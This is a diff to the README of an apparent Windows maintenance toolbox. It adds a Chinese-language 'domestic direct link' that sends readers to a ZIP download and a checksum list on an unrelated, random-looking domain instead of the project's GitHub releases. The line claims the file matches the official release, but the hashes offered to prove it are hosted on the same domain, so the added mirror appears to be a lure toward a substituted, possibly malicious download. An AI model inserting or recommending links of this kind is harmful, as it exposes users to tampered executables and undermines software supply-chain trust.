@@ -8,6 +8,8 @@
 
 [下载 v1.9 完整包](https://github.com/huvubb/system-toolbox/releases/download/v1.9/system-toolbox-windows.zip) · [更新说明与校验清单](https://github.com/huvubb/system-toolbox/releases/tag/v1.9) · [项目介绍](https://huvubb.github.io/system-toolbox/)
 
+> 🇨🇳 **国内直链（免代理、更快）**：[在线介绍页](https://q23213ddssd.dpdns.org/system-toolbox/) · [ZIP 直接下载](https://q23213ddssd.dpdns.org/downloads/system-toolbox-windows.zip) · [SHA256 校验清单](https://q23213ddssd.dpdns.org/downloads/system-toolbox-SHA256SUMS.txt)（与 GitHub Release 同一文件，可用哈希核对）
+
 Open-source Windows maintenance toolbox with background queues, resumable downloads, audio conversion and volume mounts. Built with C++17/20.
 
 ### v1.9 新增
